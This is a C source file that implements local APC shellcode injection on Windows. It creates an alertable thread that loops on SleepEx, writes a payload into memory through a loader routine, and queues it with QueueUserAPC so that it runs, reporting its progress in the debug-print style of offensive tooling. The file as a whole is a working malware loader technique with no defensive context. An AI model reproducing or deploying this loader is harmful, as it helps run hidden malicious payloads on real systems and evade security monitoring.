#include "injection.h"

VOID AlertableFunction() {
    HANDLE hEvent1 = CreateEvent(NULL, FALSE, FALSE, NULL);
    HANDLE hEvent2 = CreateEvent(NULL, FALSE, FALSE, NULL);

    if (hEvent1 && hEvent2) {
        SignalObjectAndWait(hEvent1, hEvent2, INFINITE, TRUE);
    }

    // Ensure the thread remains alertable for APC execution
    while (TRUE) {
        SleepEx(INFINITE, TRUE);  // Forces execution of queued APCs
    }

    if (hEvent1) CloseHandle(hEvent1);
    if (hEvent2) CloseHandle(hEvent2);
}


static BOOL RunViaApcInjection(HANDLE hThread, PVOID pPayload, SIZE_T sPayloadSize) {
    PVOID pAddress = NULL;

    if (!payload_loading(&pAddress, pPayload, sPayloadSize)) {
        DebugPrint("[!] Payload Loading Failed...\n");
        return FALSE;
    }

    DebugPrint("[i] QueueUserAPC with payload located at: 0x%llx\n", (ULONG_PTR)pAddress);

    // Queue the APC payload
    if (!QueueUserAPC((PAPCFUNC)(ULONG_PTR)pAddress, hThread, NULL)) {
        DebugPrint("\t[!] QueueUserAPC Failed With Error: %d \n", GetLastError());
        VirtualFree(pAddress, 0, MEM_RELEASE);
        return FALSE;
    }

    SleepEx(10, FALSE);

    return TRUE;
}

BOOL ApcInjection(HANDLE hProcess, HANDLE hThread, PBYTE pPayload, SIZE_T sPayloadSize) {
    DWORD dwThreadId = NULL;

    hThread = CreateThread(NULL, 0, &AlertableFunction, NULL, 0, &dwThreadId);
    if (hThread == NULL) {
        DebugPrint("[!] CreateThread Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    DebugPrint("[+] Alertable Target Thread Created With Id : %d \n", dwThreadId);
    DebugPrint("[i] Running Apc Injection Function ... \n");

    if (!RunViaApcInjection(hThread, pPayload, sPayloadSize)) {
        CloseHandle(hThread);
        return FALSE;
    }

    CloseHandle(hThread);

    DebugPrint("[+] APC Injection Successful \n");

    return TRUE;
}
